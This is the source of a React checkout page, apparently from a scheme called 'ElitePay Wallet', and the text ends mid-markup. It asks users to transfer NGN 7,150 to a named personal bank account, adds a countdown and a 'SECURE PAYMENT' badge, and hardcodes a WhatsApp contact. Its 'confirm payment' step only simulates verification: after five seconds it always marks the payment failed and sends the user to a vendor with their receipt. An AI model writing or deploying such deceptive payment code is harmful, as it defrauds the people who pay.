import { useEffect, useRef, useState } from 'react';
import { useRouter } from 'next/router';
import Layout from '../components/Layout';
import { saveTx } from '../utils/storage';

const CODE_PRICE = 7150;
const DISPLAY_PRICE = 7150;

const ACCOUNT_NUMBER = '6511699109';
const ACCOUNT_NAME = 'Usman Abdulrahim';
const BANK_NAME = 'Moniepoint MFB';

// WhatsApp number in international format
const WA_NUMBER = '‪2349139013928‬';

function CopyIcon({ size = 17 }) {
  return (
    <svg
      width={size}
      height={size}
      viewBox="0 0 24 24"
      fill="none"
      aria-hidden="true"
    >
      <rect
        x="8"
        y="8"
        width="11"
        height="11"
        rx="2"
        stroke="currentColor"
        strokeWidth="2"
      />

      <path
        d="M5 15H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v1"
        stroke="currentColor"
        strokeWidth="2"
        strokeLinecap="round"
      />
    </svg>
  );
}

function CheckIcon({ size = 18 }) {
  return (
    <svg
      width={size}
      height={size}
      viewBox="0 0 24 24"
      fill="none"
      aria-hidden="true"
    >
      <path
        d="M5 12.5L9.5 17L19 7.5"
        stroke="currentColor"
        strokeWidth="2.5"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

function AlertIcon({ size = 23 }) {
  return (
    <svg
      width={size}
      height={size}
      viewBox="0 0 24 24"
      fill="none"
      aria-hidden="true"
    >
      <circle
        cx="12"
        cy="12"
        r="10"
        stroke="currentColor"
        strokeWidth="2"
      />

      <path
        d="M12 7v6"
        stroke="currentColor"
        strokeWidth="2"
        strokeLinecap="round"
      />

      <circle
        cx="12"
        cy="16.5"
        r="1"
        fill="currentColor"
      />
    </svg>
  );
}

function ShieldIcon({ size = 20 }) {
  return (
    <svg
      width={size}
      height={size}
      viewBox="0 0 24 24"
      fill="none"
      aria-hidden="true"
    >
      <path
        d="M12 3l7 3v5c0 4.6-2.9 8.2-7 10-4.1-1.8-7-5.4-7-10V6l7-3Z"
        stroke="currentColor"
        strokeWidth="1.8"
        strokeLinejoin="round"
      />

      <path
        d="M9 12.2l2 2 4-4"
        stroke="currentColor"
        strokeWidth="1.8"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

/*
=========================================================
MONIEPOINT MARK
=========================================================
Uses /moniepoint-logo.png when available.

Place your Moniepoint logo here:
public/moniepoint-logo.png

A styled fallback "M" is shown if the image is unavailable.
=========================================================
*/

function MoniepointMark() {
  const [imageFailed, setImageFailed] = useState(false);

  if (imageFailed) {
    return (
      <div
        className="moniepoint-fallback"
        aria-label="Moniepoint"
      >
        M
      </div>
    );
  }

  return (
    <div
      className="moniepoint-mark"
      aria-label="Moniepoint"
    >
      <img
        src="/moniepoint-logo.png"
        alt="Moniepoint"
        onError={() => setImageFailed(true)}
      />
    </div>
  );
}

function Spinner({ dark = false }) {
  return (
    <span
      className={`spinner ${dark ? 'spinner-dark' : ''}`}
      aria-hidden="true"
    />
  );
}

export default function Checkout() {
  const router = useRouter();

  const {
    name: qName,
    phone: qPhone,
  } = router.query;

  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');

  const [countdown, setCountdown] = useState(
    10 * 60
  );

  const [copied, setCopied] = useState('');

  const [checkingPayment, setCheckingPayment] =
    useState(false);

  const [paymentFailed, setPaymentFailed] =
    useState(false);

  const [vendorModal, setVendorModal] =
    useState(false);

  const [receipt, setReceipt] =
    useState(null);

  const [vendorSubmitting, setVendorSubmitting] =
    useState(false);

  const [showPaymentNotice, setShowPaymentNotice] =
    useState(true);

  const timerRef = useRef(null);

  const verificationTimerRef =
    useRef(null);

  /*
  =========================================================
  LOAD CUSTOMER DETAILS
  =========================================================
  */

  useEffect(() => {
    if (typeof qName === 'string') {
      setName(qName);
    }

    if (typeof qPhone === 'string') {
      setPhone(qPhone);
    }
  }, [qName, qPhone]);

  /*
  =========================================================
  COUNTDOWN
  =========================================================
  */

  useEffect(() => {
    timerRef.current = setInterval(() => {
      setCountdown((current) => {
        if (current <= 1) {
          clearInterval(timerRef.current);
          return 0;
        }

        return current - 1;
      });
    }, 1000);

    return () => {
      clearInterval(timerRef.current);

      clearTimeout(
        verificationTimerRef.current
      );
    };
  }, []);

  /*
  =========================================================
  COPY
  =========================================================
  */

  const copyText = async (
    label,
    value
  ) => {
    try {
      await navigator.clipboard.writeText(
        value
      );

      setCopied(label);

      setTimeout(() => {
        setCopied('');
      }, 1500);
    } catch (error) {
      window.prompt(
        `Copy ${label}:`,
        value
      );
    }
  };

  /*
  =========================================================
  WHATSAPP
  =========================================================
  */

  const buildWhatsAppUrl = (
    customMessage = ''
  ) => {
    const defaultMessage =
      `Hello, I need assistance with my ElitePay transaction.\n\n` +
      `Name: ${
        name || 'Not provided'
      }\n` +
      `Phone: ${
        phone || 'Not provided'
      }\n` +
      `Amount: NGN ${CODE_PRICE.toLocaleString()}\n` +
      `Bank: ${BANK_NAME}\n` +
      `Account Number: ${ACCOUNT_NUMBER}\n` +
      `Account Name: ${ACCOUNT_NAME}`;

    const finalMessage =
      customMessage || defaultMessage;

    return `https://wa.me/${WA_NUMBER}?text=${encodeURIComponent(
      finalMessage
    )}`;
  };

  const openWhatsApp = (
    message = ''
  ) => {
    window.location.href =
      buildWhatsAppUrl(message);
  };

  /*
  =========================================================
  CONFIRM PAYMENT
  =========================================================

  NOTE:
  This preserves the existing 5-second verification
  simulation from your original page.
  =========================================================
  */

  const confirmPayment = () => {
    if (countdown === 0) {
      alert(
        'Payment time expired. Please restart checkout.'
      );
      return;
    }

    if (checkingPayment) return;

    setCheckingPayment(true);

    verificationTimerRef.current =
      setTimeout(() => {
        setCheckingPayment(false);

        saveTx({
          type: 'buy_code',
          amount: CODE_PRICE,
          status: 'failed',
          meta: {
            name,
            phone,
            bank: BANK_NAME,
            account: ACCOUNT_NUMBER,
            account_name: ACCOUNT_NAME,
            reason:
              'Payment verification unsuccessful',
          },
          created_at:
            new Date().toISOString(),
        });

        setPaymentFailed(true);
      }, 5000);
  };

  /*
  =========================================================
  FAILED PAYMENT
  =========================================================
  */

  const closeFailedPopupAndRefresh =
    () => {
      setPaymentFailed(false);

      setTimeout(() => {
        window.location.reload();
      }, 150);
    };

  /*
  =========================================================
  RECEIPT
  =========================================================
  */

  const handleReceiptChange = (
    event
  ) => {
    const selectedFile =
      event.target.files?.[0];

    if (!selectedFile) {
      setReceipt(null);
      return;
    }

    if (
      selectedFile.size >
      10 * 1024 * 1024
    ) {
      alert(
        'Receipt is too large. Please select a file below 10MB.'
      );

      event.target.value = '';
      setReceipt(null);

      return;
    }

    setReceipt(selectedFile);
  };

  /*
  =========================================================
  CONTACT VENDOR
  =========================================================
  */

  const contactVendor = () => {
    if (!name.trim()) {
      alert(
        'Please provide your name first.'
      );
      return;
    }

    if (!phone.trim()) {
      alert(
        'Please provide your phone number first.'
      );
      return;
    }

    if (!receipt) {
      alert(
        'Please attach your payment receipt before contacting the vendor.'
      );
      return;
    }

    setVendorSubmitting(true);

    const receiptName =
      receipt.name;

    const message =
      `Hello Vendor, I need help with my ElitePay transaction.\n\n` +
      `CUSTOMER DETAILS\n` +
      `Name: ${name.trim()}\n` +
      `Phone: ${phone.trim()}\n\n` +
      `PAYMENT DETAILS\n` +
      `Amount: NGN ${CODE_PRICE.toLocaleString()}\n` +
      `Bank: ${BANK_NAME}\n` +
      `Account Number: ${ACCOUNT_NUMBER}\n` +
      `Account Name: ${ACCOUNT_NAME}\n\n` +
      `RECEIPT\n` +
      `Receipt file: ${receiptName}\n\n` +
      `I have attached my payment receipt in this WhatsApp chat for verification.`;

    setTimeout(() => {
      setVendorSubmitting(false);

      window.location.href =
        buildWhatsAppUrl(
          message
        );
    }, 500);
  };

  /*
  =========================================================
  TIMER
  =========================================================
  */

  const minutes = String(
    Math.floor(countdown / 60)
  ).padStart(2, '0');

  const seconds = String(
    countdown % 60
  ).padStart(2, '0');

  const progressPercentage =
    Math.max(
      0,
      Math.min(
        100,
        (countdown /
          (10 * 60)) *
          100
      )
    );

  return (
    <Layout title="Payment Checkout - ElitePay Wallet">

      <style>{`

        /* =====================================================
           GLOBAL CHECKOUT
        ====================================================== */

        .checkout-shell {
          min-height:
            calc(100vh - 170px);

          padding:
            22px 14px 45px;

          display:
            flex;

          justify-content:
            center;

          background:
            radial-gradient(
              circle at 50% 0%,
              rgba(37, 99, 235, 0.10),
              transparent 34%
            ),
            linear-gradient(
              180deg,
              #f8fbff 0%,
              #f8fafc 100%
            );
        }

        .pay-screen {
          width:
            min(460px, 100%);

          position:
            relative;

          overflow:
            hidden;

          background:
            rgba(255, 255, 255, 0.98);

          border:
            1px solid #e4eaf2;

          border-radius:
            24px;

          box-shadow:
            0 28px 90px
              rgba(15, 23, 42, 0.12);
        }

        .top-gradient {
          height:
            5px;

          background:
            linear-gradient(
              90deg,
              #2563eb,
              #3b82f6,
              #60a5fa
            );
        }

        .payment-content {
          padding:
            22px;
        }

        /* =====================================================
           BRAND HEADER
        ====================================================== */

        .brand-area {
          text-align:
            center;

          margin-bottom:
            18px;
        }

        .checkout-logo {
          width:
            76px;

          height:
            76px;

          object-fit:
            contain;

          display:
            block;

          margin:
            0 auto 9px;
        }

        .checkout-badge {
          width:
            fit-content;

          margin:
            0 auto;

          display:
            inline-flex;

          align-items:
            center;

          gap:
            6px;

          padding:
            7px 11px;

          border-radius:
            999px;

          background:
            #eff6ff;

          border:
            1px solid #dbeafe;

          color:
            #2563eb;

          font-size:
            10px;

          font-weight:
            950;

          letter-spacing:
            0.08em;
        }

        .brand-status-dot {
          width:
            6px;

          height:
            6px;

          border-radius:
            50%;

          background:
            #22c55e;

          box-shadow:
            0 0 0 4px
              rgba(34,197,94,0.10);
        }

        /* =====================================================
           HERO
        ====================================================== */

        .hero-title {
          margin:
            0;

          text-align:
            center;

          color:
            #0f172a;

          font-size:
            28px;

          line-height:
            1.1;

          letter-spacing:
            -0.045em;

          font-weight:
            950;
        }

        .hero-title .currency {
          color:
            #2563eb;
        }

        .hero-subtitle {
          margin:
            8px auto 0;

          max-width:
            330px;

          text-align:
            center;

          color:
            #64748b;

          font-size:
            13px;

          line-height:
            1.5;
        }

        .copy-amount {
          display:
            inline-flex;

          align-items:
            center;

          gap:
            6px;

          margin-top:
            10px;

          padding:
            7px 11px;

          border:
            1px solid #e2e8f0;

          border-radius:
            999px;

          background:
            #ffffff;

          color:
            #475569;

          cursor:
            pointer;

          font-size:
            11px;

          font-weight:
            900;

          transition:
            0.15s ease;
        }

        .copy-amount:hover {
          border-color:
            #bfdbfe;

          color:
            #2563eb;

          background:
            #eff6ff;
        }

        /* =====================================================
           STEPS
        ====================================================== */

        .step-strip {
          display:
            grid;

          grid-template-columns:
            repeat(3, 1fr);

          gap:
            7px;

          margin:
            20px 0 15px;
        }

        .step-item {
          padding:
            10px 6px;

          border-radius:
            12px;

          background:
            #f8fafc;

          border:
            1px solid #edf2f7;

          text-align:
            center;
        }

        .step-number {
          width:
            22px;

          height:
            22px;

          margin:
            0 auto 5px;

          display:
            grid;

          place-items:
            center;

          border-radius:
            50%;

          background:
            #eaf2ff;

          color:
            #2563eb;

          font-size:
            10px;

          font-weight:
            950;
        }

        .step-text {
          color:
            #475569;

          font-size:
            10px;

          font-weight:
            850;
        }

        /* =====================================================
           INSTRUCTION BOX
        ====================================================== */

        .instruction {
          display:
            flex;

          align-items:
            flex-start;

          gap:
            10px;

          padding:
            14px;

          border-radius:
            14px;

          background:
            linear-gradient(
              135deg,
              #eff6ff,
              #f8fbff
            );

          border:
            1px solid #dbeafe;

          margin:
            14px 0;
        }

        .instruction-icon {
          width:
            34px;

          height:
            34px;

          border-radius:
            10px;

          display:
            grid;

          place-items:
            center;

          flex-shrink:
            0;

          color:
            #2563eb;

          background:
            #ffffff;

          border:
            1px solid #dbeafe;
        }

        .instruction-text {
          color:
            #475569;

          font-size:
            12px;

          line-height:
            1.5;
        }

        .instruction-text strong {
          display:
            block;

          color:
            #0f172a;

          font-size:
            13px;

          font-weight:
            950;

          margin-bottom:
            2px;
        }

        /* =====================================================
           ACCOUNT CARD
        ====================================================== */

        .account-card {
          overflow:
            hidden;

          border:
            1px solid #dce4ee;

          border-radius:
            18px;

          background:
            #ffffff;

          box-shadow:
            0 14px 35px
              rgba(15, 23, 42, 0.07);
        }

        .account-top {
          padding:
            19px 17px 18px;
        }

        .bank-row {
          display:
            flex;

          align-items:
            center;

          justify-content:
            center;

          gap:
            11px;

          margin-bottom:
            16px;
        }

        .moniepoint-mark,
        .moniepoint-fallback {
          width:
            48px;

          height:
            48px;

          flex-shrink:
            0;

          display:
            flex;

          align-items:
            center;

          justify-content:
            center;

          overflow:
            hidden;

          border-radius:
            13px;

          background:
            #ffffff;

          border:
            1px solid #e2e8f0;

          box-shadow:
            0 7px 18px
              rgba(15,23,42,0.08);
        }

        .moniepoint-mark img {
          width:
            100%;

          height:
            100%;

          object-fit:
            contain;

          padding:
            4px;
        }

        .moniepoint-fallback {
          background:
            linear-gradient(
              135deg,
              #111827,
              #0f172a
            );

          color:
            #ffffff;

          font-size:
            25px;

          font-weight:
            950;
        }

        .bank-info {
          text-align:
            left;
        }

        .bank-label {
          display:
            block;

          color:
            #94a3b8;

          font-size:
            9px;

          font-weight:
            950;

          text-transform:
            uppercase;

          letter-spacing:
            0.10em;

          margin-bottom:
            4px;
        }

        .bank-name {
          color:
            #0f172a;

          font-size:
            15px;

          font-weight:
            950;
        }

        /* =====================================================
           ACCOUNT NUMBER
        ====================================================== */

        .account-number-area {
          padding:
            15px 12px;

          border:
            1px solid #dbeafe;

          background:
            linear-gradient(
              180deg,
              #f8fbff,
              #eff6ff
            );

          border-radius:
            14px;

          text-align:
            center;
        }

        .account-number-label {
          margin-bottom:
            5px;

          color:
            #64748b;

          font-size:
            9px;

          font-weight:
            950;

          text-transform:
            uppercase;

          letter-spacing:
            0.12em;
        }

        .account-number-button {
          border:
            0;

          padding:
            2px 0;

          display:
            inline-flex;

          align-items:
            center;

          justify-content:
            center;

          gap:
            9px;

          background:
            transparent;

          color:
            #155eef;

          cursor:
            pointer;

          font-size:
            28px;

          line-height:
            1.15;

          font-weight:
            950;

          letter-spacing:
            0.025em;
        }

        .account-name {
          margin:
            10px 0 0;

          text-align:
            center;

          color:
            #1e293b;

          font-size:
            15px;

          font-weight:
            900;
        }

        .account-name-label {
          display:
            block;

          color:
            #94a3b8;

          font-size:
            9px;

          font-weight:
            900;

          text-transform:
            uppercase;

          letter-spacing:
            0.08em;

          margin-bottom:
            3px;
        }

        .account-footer {
          display:
            flex;

          align-items:
            center;

          justify-content:
            center;

          gap:
            8px;

          padding:
            11px;

          border-top:
            1px solid #edf2f7;

          background:
            #fafbfd;

          color:
            #64748b;

          font-size:
            10px;

          line-height:
            1.4;

          font-weight:
            800;

          text-align:
            center;
        }

        .warning-dot {
          width:
            18px;

          height:
            18px;

          display:
            grid;

          place-items:
            center;

          flex-shrink:
            0;

          border-radius:
            50%;

          background:
            #fff1f2;

          color:
            #e11d48;

          font-size:
            12px;

          font-weight:
            950;
        }

        .copy-feedback {
          min-height:
            22px;

          margin-top:
            6px;

          text-align:
            center;

          color:
            #059669;

          font-size:
            11px;

          font-weight:
            900;
        }

        /* =====================================================
           TIMER
        ====================================================== */

        .timer-card {
          margin-top:
            8px;

          padding:
            13px;

          border:
            1px solid #e2e8f0;

          border-radius:
            14px;

          background:
            #ffffff;
        }

        .timer-top {
          display:
            flex;

          justify-content:
            space-between;

          align-items:
            center;

          margin-bottom:
            8px;
        }

        .timer-label {
          color:
            #64748b;

          font-size:
            10px;

          font-weight:
            900;
        }

        .timer-value {
          color:
            ${countdown <= 60
              ? '#dc2626'
              : '#0f172a'};

          font-size:
            12px;

          font-weight:
            950;
        }

        .progress-wrap {
          height:
            7px;

          width:
            100%;

          overflow:
            hidden;

          border-radius:
            999px;

          background:
            #e2e8f0;
        }

        .progress-bar {
          height:
            100%;

          border-radius:
            inherit;

          background:
            linear-gradient(
              90deg,
              #2563eb,
              #60a5fa
            );

          transition:
            width 0.4s ease;
        }

        .timer-note {
          margin:
            8px 0 0;

          text-align:
            center;

          color:
            ${countdown <= 60
              ? '#dc2626'
              : '#64748b'};

          font-size:
            10px;

          font-weight:
            800;
        }

        /* =====================================================
           CONFIRM BUTTON
        ====================================================== */

        .confirm-section {
          margin-top:
            15px;
        }

        .confirm-note {
          margin:
            0 0 10px;

          text-align:
            center;

          color:
            #94a3b8;

          font-size:
            10px;

          line-height:
            1.45;
        }

        .confirm-button {
          width:
            100%;

          border:
            0;

          border-radius:
            13px;

          padding:
            15px 16px;

          cursor:
            pointer;

          background:
            linear-gradient(
              135deg,
              #2563eb,
              #1d4ed8
            );

          color:
            #ffffff;

          font-size:
            14px;

          font-weight:
            950;

          box-shadow:
            0 15px 30px
              rgba(37,99,235,0.22);

          transition:
            transform 0.15s ease,
            box-shadow 0.15s ease,
            opacity 0.15s ease;
        }

        .confirm-button:hover {
          transform:
            translateY(-1px);

          box-shadow:
            0 18px 36px
              rgba(37,99,235,0.28);
        }

        .confirm-button:disabled {
          cursor:
            not-allowed;

          opacity:
            0.62;

          transform:
            none;
        }

        .button-content {
          display:
            inline-flex;

          align-items:
            center;

          justify-content:
            center;

          gap:
            9px;
        }

        .spinner {
          width:
            17px;

          height:
            17px;

          display:
            inline-block;

          border:
            2px solid
              rgba(255,255,255,0.34);

          border-top-color:
            #ffffff;

          border-radius:
            50%;

          animation:
            spin 0.8s linear infinite;
        }

        .spinner-dark {
          border:
            2px solid
              rgba(37,99,235,0.15);

          border-top-color:
            #2563eb;
        }

        /* =====================================================
           VENDOR BUTTON
        ====================================================== */

        .vendor-main-button {
          width:
            100%;

          margin-top:
            9px;

          padding:
            13px 16px;

          border-radius:
            13px;

          border:
            1px solid #bbf7d0;

          background:
            #f0fdf4;

          color:
            #15803d;

          cursor:
            pointer;

          font-size:
            13px;

          font-weight:
            950;

          transition:
            0.15s ease;
        }

        .vendor-main-button:hover {
          transform:
            translateY(-1px);

          background:
            #dcfce7;
        }

        /* =====================================================
           TRUST ROW
        ====================================================== */

        .trust-row {
          margin-top:
            17px;

          display:
            flex;

          align-items:
            center;

          justify-content:
            center;

          gap:
            7px;

          color:
            #64748b;

          font-size:
            10px;

          font-weight:
            800;

          text-align:
            center;
        }

        .trust-icon {
          color:
            #16a34a;

          display:
            flex;
        }

        /* =====================================================
           FOOTER
        ====================================================== */

        .footer-actions {
          display:
            grid;

          grid-template-columns:
            1fr
            1px
            1fr;

          align-items:
            center;

          margin-top:
            15px;

          padding-top:
            9px;

          border-top:
            1px solid #edf2f7;
        }

        .divider {
          width:
            1px;

          height:
            21px;

          background:
            #dbe3ed;
        }

        .text-action {
          border:
            0;

          background:
            transparent;

          cursor:
            pointer;

          padding:
            8px;

          font-size:
            13px;

          font-weight:
            900;
        }

        .cancel {
          color:
            #ef4444;
        }

        .help {
          color:
            #0f172a;
        }

        /* =====================================================
           MODALS
        ====================================================== */

        .modal-overlay {
          position:
            fixed;

          inset:
            0;

          z-index:
            9999;

          display:
            flex;

          align-items:
            center;

          justify-content:
            center;

          padding:
            18px;

          background:
            rgba(15,23,42,0.66);

          backdrop-filter:
            blur(8px);

          -webkit-backdrop-filter:
            blur(8px);
        }

        .modal {
          width:
            min(440px, 100%);

          max-height:
            92vh;

          overflow-y:
            auto;

          padding:
            22px;

          border:
            1px solid #e2e8f0;

          border-radius:
            20px;

          background:
            #ffffff;

          box-shadow:
            0 35px 90px
              rgba(15,23,42,0.28);

          animation:
            modalIn 0.2s ease-out;
        }

        .notice-modal {
          text-align:
            center;
        }

        /* =====================================================
           NOTICE MODAL
        ====================================================== */

        .notice-icon {
          width:
            62px;

          height:
            62px;

          margin:
            0 auto 12px;

          border-radius:
            50%;

          display:
            grid;

          place-items:
            center;

          background:
            #eff6ff;

          border:
            1px solid #dbeafe;

          color:
            #2563eb;
        }

        .notice-badge {
          display:
            inline-flex;

          padding:
            5px 9px;

          border-radius:
            999px;

          background:
            #eff6ff;

          color:
            #2563eb;

          border:
            1px solid #dbeafe;

          font-size:
            9px;

          font-weight:
            950;

          letter-spacing:
            0.10em;

          margin-bottom:
            10px;
        }

        .modal-title {
          margin:
            0;

          color:
            #0f172a;

          font-size:
            21px;

          line-height:
            1.2;

          font-weight:
            950;
        }

        .modal-text {
          margin:
            9px 0 15px;

          color:
            #64748b;

          font-size:
            13px;

          line-height:
            1.55;
        }

        .notice-list {
          display:
            grid;

          gap:
            8px;

          text-align:
            left;

          margin:
            14px 0;
        }

        .notice-item {
          display:
            flex;

          align-items:
            flex-start;

          gap:
            9px;

          padding:
            11px;

          border-radius:
            11px;

          background:
            #f8fafc;

          border:
            1px solid #edf2f7;

          color:
            #475569;

          font-size:
            11px;

          line-height:
            1.5;
        }

        .notice-check {
          color:
            #2563eb;

          margin-top:
            1px;

          flex-shrink:
            0;
        }

        .notice-continue {
          width:
            100%;

          border:
            0;

          border-radius:
            13px;

          padding:
            14px 16px;

          background:
            linear-gradient(
              135deg,
              #2563eb,
              #1d4ed8
            );

          color:
            #ffffff;

          font-size:
            14px;

          font-weight:
            950;

          cursor:
            pointer;

          box-shadow:
            0 13px 28px
              rgba(37,99,235,0.22);
        }

        .notice-footer {
          margin-top:
            9px;

          color:
            #94a3b8;

          font-size:
            10px;

          line-height:
            1.4;
        }

        /* =====================================================
           VERIFICATION MODAL
        ====================================================== */

        .verification-modal {
          text-align:
            center;
        }

        .loading-circle {
          width:
            60px;

          height:
            60px;

          margin:
            0 auto 13px;

          display:
            grid;

          place-items:
            center;

          border-radius:
            50%;

          background:
            #eff6ff;

          border:
            1px solid #bfdbfe;

          color:
            #2563eb;
        }

        .verification-caption {
          color:
            #64748b;

          font-size:
            11px;

          font-weight:
            850;
        }

        /* =====================================================
           FAILED MODAL
        ====================================================== */

        .failed-modal {
          text-align:
            center;
        }

        .failed-icon {
          width:
            60px;

          height:
            60px;

          margin:
            0 auto 13px;

          display:
            grid;

          place-items:
            center;

          border-radius:
            50%;

          background:
            #fef2f2;

          border:
            1px solid #fecaca;

          color:
            #dc2626;
        }

        .failed-message {
          margin-bottom:
            15px;

          padding:
            12px;

          border:
            1px solid #fecaca;

          border-radius:
            12px;

          background:
            #fef2f2;

          color:
            #991b1b;

          font-size:
            12px;

          line-height:
            1.5;

          font-weight:
            800;
        }

        .modal-close-button {
          width:
            100%;

          border:
            0;

          border-radius:
            12px;

          padding:
            13px 16px;

          background:
            #dc2626;

          color:
            #ffffff;

          cursor:
            pointer;

          font-size:
            13px;

          font-weight:
            950;
        }

        /* =====================================================
           VENDOR MODAL
        ====================================================== */

        .vendor-header {
          display:
            flex;

          justify-content:
            space-between;

          align-items:
            flex-start;

          gap:
            10px;
        }

        .modal-x {
          width:
            34px;

          height:
            34px;

          flex-shrink:
            0;

          display:
            grid;

          place-items:
            center;

          border:
            1px solid #e2e8f0;

          border-radius:
            50%;

          background:
            #f8fafc;

          color:
            #475569;

          cursor:
            pointer;

          font-size:
            18px;
        }

        .details-card {
          margin:
            12px 0 15px;

          padding:
            13px;

          border:
            1px solid #e2e8f0;

          border-radius:
            13px;

          background:
            #f8fafc;
        }

        .details-title {
          margin-bottom:
            9px;

          color:
            #0f172a;

          font-size:
            11px;

          font-weight:
            950;

          letter-spacing:
            0.03em;
        }

        .detail-row {
          display:
            flex;

          justify-content:
            space-between;

          gap:
            14px;

          padding:
            7px 0;

          border-bottom:
            1px dashed #dfe7ef;

          font-size:
            11px;
        }

        .detail-row:last-child {
          border-bottom:
            0;

          padding-bottom:
            0;
        }

        .detail-row:first-of-type {
          padding-top:
            0;
        }

        .detail-label {
          color:
            #64748b;

          font-weight:
            750;
        }

        .detail-value {
          color:
            #0f172a;

          font-weight:
            900;

          text-align:
            right;

          word-break:
            break-word;
        }

        .field-label {
          display:
            block;

          margin-bottom:
            6px;

          color:
            #334155;

          font-size:
            11px;

          font-weight:
            900;
        }

        .text-input {
          width:
            100%;

          box-sizing:
            border-box;

          margin-bottom:
            12px;

          padding:
            11px 12px;

          border:
            1px solid #cbd5e1;

          border-radius:
            10px;

          outline:
            none;

          background:
            #ffffff;

          color:
            #0f172a;

          font-size:
            12px;
        }

        .text-input:focus {
          border-color:
            #2563eb;

          box-shadow:
            0 0 0 3px
              rgba(37,99,235,0.10);
        }

        .receipt-box {
          margin-top:
            4px;

          padding:
            13px;

          border:
            1.5px dashed #93c5fd;

          border-radius:
            13px;

          background:
            #eff6ff;
        }

        .receipt-box-title {
          margin-bottom:
            4px;

          color:
            #1e40af;

          font-size:
            11px;

          font-weight:
            950;
        }

        .receipt-box-text {
          margin-bottom:
            9px;

          color:
            #64748b;

          font-size:
            10px;

          line-height:
            1.5;
        }

        .receipt-input {
          width:
            100%;

          font-size:
            11px;
        }

        .receipt-file {
          margin-top:
            8px;

          padding:
            8px 9px;

          border-radius:
            8px;

          background:
            #ffffff;

          color:
            #334155;

          font-size:
            10px;

          font-weight:
            800;

          word-break:
            break-word;
        }

        .vendor-submit {
          width:
            100%;

          margin-top:
            13px;

          padding:
            13px 16px;

          border:
            0;

          border-radius:
            12px;

          background:
            linear-gradient(
              135deg,
              #16a34a,
              #15803d
            );

          color:
            #ffffff;

          cursor:
            pointer;

          font-size:
            13px;

          font-weight:
            950;

          box-shadow:
            0 13px 27px
              rgba(22,163,74,0.18);
        }

        .vendor-submit:disabled {
          opacity:
            0.6;

          cursor:
            not-allowed;
        }

        .whatsapp-note {
          margin-top:
            9px;

          text-align:
            center;

          color:
            #94a3b8;

          font-size:
            9px;

          line-height:
            1.5;
        }

        /* =====================================================
           ANIMATIONS
        ====================================================== */

        @keyframes spin {
          to {
            transform:
              rotate(360deg);
          }
        }

        @keyframes modalIn {
          from {
            opacity:
              0;

            transform:
              translateY(8px)
              scale(0.97);
          }

          to {
            opacity:
              1;

            transform:
              translateY(0)
              scale(1);
          }
        }

        /* =====================================================
           MOBILE
        ====================================================== */

        @media (max-width: 480px) {

          .checkout-shell {
            padding:
              8px 7px 24px;
          }

          .pay-screen {
            border-radius:
              18px;
          }

          .payment-content {
            padding:
              17px;
          }

          .hero-title {
            font-size:
              25px;
          }

          .account-number-button {
            font-size:
              23px;
          }

          .moniepoint-mark,
          .moniepoint-fallback {
            width:
              44px;

            height:
              44px;

            border-radius:
              11px;
          }

          .step-item {
            padding:
              9px 4px;
          }

          .step-text {
            font-size:
              9px;
          }

          .modal {
            padding:
              18px;
          }

        }

      `}</style>

      {/* =====================================================
          MAIN CHECKOUT
      ====================================================== */}

      <div className="checkout-shell">

        <section
          className="pay-screen"
          aria-label="ElitePay bank transfer checkout"
        >

          <div className="top-gradient" />

          <div className="payment-content">

            {/* BRAND */}

            <div className="brand-area">

              <img
                className="checkout-logo"
                src="/elitepay-logo.png"
                alt="ElitePay"
              />

              <div className="checkout-badge">

                <span className="brand-status-dot" />

                SECURE PAYMENT

              </div>

            </div>

            {/* HERO */}

            <h1 className="hero-title">

              Pay{' '}

              <span className="currency">
                NGN {DISPLAY_PRICE.toLocaleString()}
              </span>

            </h1>

            <p className="hero-subtitle">

              Complete your payment by
              transferring the exact amount
              to the account below.

            </p>

            <div
              style={{
                textAlign:
                  'center',
              }}
            >

              <button
                className="copy-amount"
                onClick={() =>
                  copyText(
                    'amount',
                    String(DISPLAY_PRICE)
                  )
                }
                type="button"
              >

                <CopyIcon
                  size={14}
                />

                Copy payment amount

              </button>

            </div>

            {/* STEPS */}

            <div className="step-strip">

              <div className="step-item">

                <div className="step-number">
                  1
                </div>

                <div className="step-text">
                  Copy details
                </div>

              </div>

              <div className="step-item">

                <div className="step-number">
                  2
                </div>

                <div className="step-text">
                  Make transfer
                </div>

              </div>

              <div className="step-item">

                <div className="step-number">
                  3
                </div>

                <div className="step-text">
                  Confirm payment
                </div>

              </div>

            </div>

            {/* INSTRUCTION */}

            <div className="instruction">

              <div className="instruction-icon">

                <ShieldIcon
                  size={18}
                />

              </div>

              <div className="instruction-text">

                <strong>
                  Transfer exactly NGN {CODE_PRICE.toLocaleString()}
                </strong>

                Ensure that the amount you send
                matches the amount shown above.

              </div>

            </div>

            {/* ACCOUNT */}

            <div className="account-card">

              <div className="account-top">

                <div className="bank-row">

                  <MoniepointMark />

                  <div className="bank-info">

                    <span className="bank-label">
                      Bank name
                    </span>

                    <div className="bank-name">
                      {BANK_NAME}
                    </div>

                  </div>

                </div>

                <div className="account-number-area">

                  <div className="account-number-label">
                    Account number
                  </div>

                  <button
                    className="account-number-button"
                    onClick={() =>
                      copyText(
                        'account number',
                        ACCOUNT_NUMBER
                      )
                    }
                    type="button"
                    aria-label="Copy account number"
                  >

                    {ACCOUNT_NUMBER}

                    {copied ===
                    'account number' ? (
                      <CheckIcon
                        size={18}
                      />
                    ) : (
                      <CopyIcon
                        size={18}
                      />
                    )}

                  </button>

                  <div className="account-name">

                    <span className="account-name-label">
                      Account name
                    </span>

                    {ACCOUNT_NAME}

                  </div>

                </div>

              </div>

              <div className="account-footer">

                <span className="warning-dot">
                  !
                </span>

                <span>
                  Verify the account name and number
                  before sending your payment.
                </span>

              </div>

            </div>

            {/* COPY FEEDBACK */}

            <div className="copy-feedback">

              {copied
                ? (
                  <span
                    style={{
                      display:
                        'inline-flex',
                      alignItems:
                        'center',
                      gap:
                        '5px',
                    }}
                  >

                    <CheckIcon
                      size={14}
                    />

                    {copied} copied

                  </span>
                )
                : null}

            </div>

            {/* TIMER */}

            <div className="timer-card">

              <div className="timer-top">

                <span className="timer-label">
                  PAYMENT WINDOW
                </span>

                <span className="timer-value">
                  {minutes}:{seconds}
                </span>

              </div>

              <div className="progress-wrap">

                <div
                  className="progress-bar"
                  style={{
                    width:
                      `${progressPercentage}%`,
                  }}
                />

              </div>

              <div className="timer-note">

                {countdown > 0
